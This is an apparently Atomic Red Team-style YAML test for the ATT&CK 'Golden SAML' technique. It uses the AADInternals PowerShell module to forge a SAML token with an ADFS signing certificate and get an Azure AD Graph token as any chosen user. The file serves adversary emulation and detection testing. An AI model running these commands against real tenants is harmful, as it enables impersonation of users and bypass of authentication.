attack_technique: T1606.002
display_name: 'Forge Web Credentials: SAML token'
atomic_tests:
- name: Golden SAML
  auto_generated_guid: b16a03bc-1089-4dcc-ad98-30fe8f3a2b31
  description: |
    Authenticate to AADGraph as any user with the ADFS signing token certificate.
  supported_platforms:
  - azure-ad
  input_arguments:
    certificate_path:
      description: Token signing certificate path
      type: Path
      default: '.\ADFS_signing.pfx'
    immutable_id:
      description: ImmutableId of the targetted user
      type: String
      default: "aehgdqBTZV50DKQZmNJ8mg=="
    issuer_uri:
      description: Issuer URI of the ADFS service
      type: String
      default: "http://contoso.com/adfs/services/trust/"
  dependency_executor_name: powershell
  dependencies:
  - description: |
        AADInternals module must be installed.
    prereq_command: |
      if (Get-Module AADInternals) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AADInternals -Force
  executor:
    command: |
      Import-Module AADInternals -Force
      $saml = New-AADIntSAMLToken -ImmutableID #{immutable_id} -PfxFileName #{certificate_path} -Issuer #{issuer_uri}
      $conn = Get-AccessTokenForAADGraph -SAMLToken $saml -SaveToCache
      Write-Host "Successfully connectes as $conn.User"
    name: powershell

